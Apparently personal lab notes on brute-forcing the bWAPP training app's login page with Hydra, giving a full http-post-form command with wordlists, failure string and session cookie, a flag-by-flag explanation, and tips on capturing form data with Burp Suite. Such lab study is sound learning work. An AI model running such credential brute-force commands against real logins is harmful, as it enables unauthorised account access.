
```
hydra -V -L /root/Desktop/Files/docswords.txt -P /root/Desktop/Files/docswords.txt 10.211.55.14 http-post-form "/bWAPP/ba_pwd_attacks_1.php: login=^USER^&password=^PASS^&form=submit: F=Invalid credentials! Did you forgot your password ?: H=Cookie:
PHPSESSID=e7006f3c23d3994a8b28ad8a2b27b325; security_level=0; SQLiteManager_currentTheme=green; SQLiteManager_currentLangue=2"
```

-L => User all the words in this list as a username, example : /root/Desktop/Files/docswords.txt
-P => User all word in this list as a password, example: /root/Desktop/Files/docswords.txt
http-post-form => go this this form page, example: /bWAPP/ba_pwd_attacks_1.php

Using burpsuite, you can get this info to know what info is being sent to the website: ```
```
login=^USER^&password=^PASS^&form=submit: F=Invalid credentials! Did you forgot your password ?: H=Cookie:
PHPSESSID=e7006f3c23d3994a8b28ad8a2b27b325; security_level=0; SQLiteManager_currentTheme=green; SQLiteManager_currentLangue=2"
```

F= are the incorrect details. you can get this when you try to login with wrong credentials. F=Invalid credentials! Did you forgot your password ?
This can yield false positives
Cookie: => cookie details can be found using Burpsuite


![[Pasted image 20260428063349.png]]

Example output when running:
![[Pasted image 20260428063542.png]]

